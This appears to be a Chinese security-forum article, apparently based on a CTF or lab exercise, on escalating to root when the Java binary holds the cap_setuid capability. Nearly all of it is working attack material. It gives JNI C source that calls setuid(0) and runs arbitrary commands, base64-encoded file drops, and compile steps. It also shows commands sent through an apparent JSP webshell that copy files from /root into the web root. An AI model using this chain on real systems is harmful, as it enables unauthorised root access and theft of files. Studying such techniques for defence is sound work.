# Java特权下的JNI提权-Java安全研究-先知社区

> **来源**: https://xz.aliyun.com/news/16524  
> **文章ID**: 16524

---

## Java特权下的JNI提权

### JNI提权执行Java命令

getcap查找设置了capabilities的命令

```
getcap -r / 2>/dev/null  

/usr/local/openjdk-8/bin/java = cap_setuid+ep

```

发现java有setuid权限，利用jni提权

先写入Main.java

```
cmd = b"echo cHVibGljIGNsYXNzIE5hdGl2ZUxpYnJhcnlFeGFtcGxlIHsKICAgIC8vIOWjsOaYjm5hdGl2ZeaWueazlQogICAgcHVibGljIG5hdGl2ZSB2b2lkIG5hdGl2ZU1ldGhvZChTdHJpbmcgY21kKTsKCn0=|base64 -d >/tmp/NativeLibraryExample.java"

```

```
public class NativeLibraryExample {
    // 声明native方法
    public native void nativeMethod(String cmd);

}

```

编译生成头文件

```
cmd = b"cd /tmp;javac NativeLibraryExample.java"  
cmd = b"cd /tmp;javah -jni NativeLibraryExample"

```

编写JniClass.c 并包含头文件

```
#include <jni.h>  
#include "NativeLibraryExample.h"  
#include <string.h>  
#include <stdio.h>  
#include <sys/types.h>  
#include <unistd.h>  
#include <stdlib.h>  

int execmd(const char *cmd, char *result)  
{  
    setuid(0);  
    char buffer[1024*12];              //定义缓冲区  
    FILE *pipe = popen(cmd, "r"); //打开管道，并执行命令  
    if (!pipe)  
        return 0; //返回0表示运行失败  

    while (!feof(pipe))  
    {  
        if (fgets(buffer, sizeof(buffer), pipe))  
        { //将管道输出到result中  
            strcat(result, buffer);  
        }  
    }  
    pclose(pipe); //关闭管道  
    return 1;      //返回1表示运行成功  
}  

JNIEXPORT void JNICALL Java_NativeLibraryExample_nativeMethod(JNIEnv *env, jobject obj, jstring jstr)  

{  

    const char *cstr = (*env)->GetStringUTFChars(env, jstr, NULL);  
    char result[1024 * 12] = "";  
    if (1 == execmd(cstr, result))  
    {  
       // printf(result);  
    }  

    char return_messge[100] = "";  
    strcat(return_messge, result);  
    jstring cmdresult = (*env)->NewStringUTF(env, return_messge);  
    //system();  

    return cmdresult;  
}

```

用base64编码写入

```
cmd = b"echo I2luY2x1ZGUgPGpuaS5oPgojaW5jbHVkZSAiTmF0aXZlTGlicmFyeUV4YW1wbGUuaCIKI2luY2x1ZGUgPHN0cmluZy5oPgojaW5jbHVkZSA8c3RkaW8uaD4KI2luY2x1ZGUgPHN5cy90eXBlcy5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KCmludCBleGVjbWQoY29uc3QgY2hhciAqY21kLCBjaGFyICpyZXN1bHQpCnsKICAgIHNldHVpZCgwKTsKICAgIGNoYXIgYnVmZmVyWzEwMjQqMTJdOyAgICAgICAgICAgICAgLy/lrprkuYnnvJPlhrLljLoKICAgIEZJTEUgKnBpcGUgPSBwb3BlbihjbWQsICJyIik7IC8v5omT5byA566h6YGT77yM5bm25omn6KGM5ZG95LukCiAgICBpZiAoIXBpcGUpCiAgICAgICAgcmV0dXJuIDA7IC8v6L+U5ZueMOihqOekuui/kOihjOWksei0pQoKICAgIHdoaWxlICghZmVvZihwaXBlKSkKICAgIHsKICAgICAgICBpZiAoZmdldHMoYnVmZmVyLCBzaXplb2YoYnVmZmVyKSwgcGlwZSkpCiAgICAgICAgeyAvL+WwhueuoemBk+i+k+WHuuWIsHJlc3VsdOS4rQogICAgICAgICAgICBzdHJjYXQocmVzdWx0LCBidWZmZXIpOwogICAgICAgIH0KICAgIH0KICAgIHBjbG9zZShwaXBlKTsgLy/lhbPpl63nrqHpgZMKICAgIHJldHVybiAxOyAgICAgIC8v6L+U5ZueMeihqOekuui/kOihjOaIkOWKnwp9CgoKSk5JRVhQT1JUIHZvaWQgSk5JQ0FMTCBKYXZhX05hdGl2ZUxpYnJhcnlFeGFtcGxlX25hdGl2ZU1ldGhvZChKTklFbnYgKmVudiwgam9iamVjdCBvYmosIGpzdHJpbmcganN0cikKCnsKCiAgICBjb25zdCBjaGFyICpjc3RyID0gKCplbnYpLT5HZXRTdHJpbmdVVEZDaGFycyhlbnYsIGpzdHIsIE5VTEwpOwogICAgY2hhciByZXN1bHRbMTAyNCAqIDEyXSA9ICIiOwogICAgaWYgKDEgPT0gZXhlY21kKGNzdHIsIHJlc3VsdCkpCiAgICB7CiAgICAgICAvLyBwcmludGYocmVzdWx0KTsKICAgIH0KCiAgICBjaGFyIHJldHVybl9tZXNzZ2VbMTAwXSA9ICIiOwogICAgc3RyY2F0KHJldHVybl9tZXNzZ2UsIHJlc3VsdCk7CiAgICBqc3RyaW5nIGNtZHJlc3VsdCA9ICgqZW52KS0+TmV3U3RyaW5nVVRGKGVudiwgcmV0dXJuX21lc3NnZSk7CiAgICAvL3N5c3RlbSgpOwoKICAgIHJldHVybiBjbWRyZXN1bHQ7Cn0K|base64 -d >/tmp/JniClass.c"

```

编译为动态链接

```
cmd = b'cd /tmp;gcc -fPIC -I"$JAVA_HOME/include" -I"$JAVA_HOME/include/linux" -shared -o libcmd.so JniClass.c'

```

写入新的java编译后加载动态链接 调用恶意函数RCE

```
cmd = b"echo cHVibGljIGNsYXNzIE1haW4gewogICAgcHVibGljIG5hdGl2ZSB2b2lkIG5hdGl2ZU1ldGhvZChTdHJpbmcgY21kKTsKICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBtYWluKFN0cmluZ1tdIGFyZ3MpIHsKICAgICAgICBTeXN0ZW0ubG9hZCgiL3RtcC9saWJjbWQuc28iKTsKICAgICAgICBOYXRpdmVMaWJyYXJ5RXhhbXBsZSBleGFtcGxlID0gbmV3IE5hdGl2ZUxpYnJhcnlFeGFtcGxlKCk7CgogICAgICAgIGV4YW1wbGUubmF0aXZlTWV0aG9kKCJjYXQgL3Jvb3QvbWVzc2FnZS50eHQgPiAvdG1wLzIudHh0Iik7IAogICAgfQp9|base64 -d >/tmp/Main.java"  
cmd = b"cd /tmp;javac Main.java"  

cmd = b"cd /tmp;java Main 2&>/opt/jetty/webapps/ROOT/WEB-INF/1.txt"  

cmd = b'cat /tmp/2.txt>/opt/jetty/webapps/ROOT/WEB-INF/1.txt'

```

base64解密后的java文件：

```
public class Main {  
    public native void nativeMethod(String cmd);  
    public static void main(String[] args) {  
        System.load("/tmp/libcmd.so");  
        NativeLibraryExample example = new NativeLibraryExample();  

        example.nativeMethod("cat /root/message.txt > /tmp/2.txt");   
    }  
}

```

### SetUID后的提权

Java 本身并不提供直接操作操作系统的 `setuid` 调用但可以使用 JNI 调用 `setuid`来提权

编写C文件 SetUID.c，执行setuid命令，传参uid

```
#include <jni.h>
#include <unistd.h>

JNIEXPORT jint JNICALL Java_SetUID_setUID(JNIEnv *env, jobject obj, jint uid) {
    return setuid(uid);
}

```

注意：由于没有包含编译java生成的头文件，**所以要包含jdk中自带的jni.h**，否则会报错：unknown type name 'JNIEXPORT'等

而`JNIEXPORT jint JNICALL Java_SetUID_setUID(JNIEnv *env, jobject obj, jint uid)`的函数格式需要自己在本地编译下面的java文件的头文件里面会有：

```
public class Main {  
    public native void nativeMethod(String cmd);  
}

```

利用base64编码写入

```
2.jsp?cmd=echo%20"I2luY2x1ZGUgPGpuaS5oPgovLzExMTExMTExMTExMjIKI2luY2x1ZGUgPHVuaXN0ZC5oPgoKSk5JRVhQT1JUIGppbnQgSk5JQ0FMTCBKYXZhX1NldFVJRF9zZXRVSUQoSk5JRW52ICplbnYsIGpvYmplY3Qgb2JqLCBqaW50IHVpZCkgewogICAgcmV0dXJuIHNldHVpZCh1aWQpOwp9"%20|base64%20-d%20>/opt/jetty/webapps/ROOT/SetUID.c

```

然后编译SetUID.c 生成动态链接

```
2.jsp?cmd=gcc -shared -fPIC -o /opt/jetty/webapps/ROOT/libSetUID.so -I${JAVA_HOME}/include -I${JAVA_HOME}/include/linux /opt/jetty/webapps/ROOT/SetUID.c

```

写SetUID.java，设置接口，并加载SetUID动态链接，执行setuid(0)后RCE就是root权限

```
public class SetUID {
    static {
        System.loadLibrary("SetUID"); 
    }

    public native int setUID(int uid); 

    public static void main(String[] args) throws Exception {
        SetUID setUID = new SetUID();
        int result = setUID.setUID(0); 
        Runtime.getRuntime.exec(new String[]{"sh","-c","cat /root/*.txt>/opt/jetty/webapps/ROOT/root.txt"});
    }
}

```

```
2.jsp?cmd=echo%20"cHVibGljIGNsYXNzIFNldFVJRCB7CiAgICBzdGF0aWMgewogICAgICAgIFN5c3RlbS5sb2FkTGlicmFyeSgiU2V0VUlEIik7IAogICAgfQoKICAgIHB1YmxpYyBuYXRpdmUgaW50IHNldFVJRChpbnQgdWlkKTsgCiAgLy9hCiAgICBwdWJsaWMgc3RhdGljIHZvaWQgbWFpbihTdHJpbmdbXSBhcmdzKSB0aHJvd3MgRXhjZXB0aW9uIHsKICAgICAgICBTZXRVSUQgc2V0VUlEID0gbmV3IFNldFVJRCgpOwogICAgICAgIGludCByZXN1bHQgPSBzZXRVSUQuc2V0VUlEKDApOyAKICAgICAgICBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKG5ldyBTdHJpbmdbXXsic2giLCItYyIsImNhdCAvcm9vdC8qLnR4dD4vb3B0L2pldHR5L3dlYmFwcHMvUk9PVC9yb290LnR4dCJ9KTsKICAgIH0KfQ=="%20|base64%20-d%20>/opt/jetty/webapps/ROOT/SetUID.java

```

编译SetUID.java

```
2.jsp?cmd=javac%20/opt/jetty/webapps/ROOT/SetUID.java

```

执行java提权rce

```
2.jsp?cmd=java -Djava.library.path=/opt/jetty/webapps/ROOT/ -cp /opt/jetty/webapps/ROOT/ SetUID

```

* **`-Djava.library.path=/opt/jetty/webapps/ROOT/`**:

  + 这个参数设置了 JVM 加载本地库（通常是 `.so` 或 `.dll` 文件）的路径。
  + 在这个例子中，`/opt/jetty/webapps/ROOT/` 目录被指定为 Java 应用加载本地库时的搜索路径。
* **`-cp /opt/jetty/webapps/ROOT/`**:

  + `-cp`（class path）指定了 Java 类路径，JVM 会根据这个路径寻找和加载 Java 类文件。
  + 这里 `/opt/jetty/webapps/ROOT/` 是指定了类路径，可能是应用的根目录或包含 Java 类文件的位置。
* **`-D`** 是 Java 命令行启动选项中的一个参数，用于设置 Java 系统属性比如**库路径**
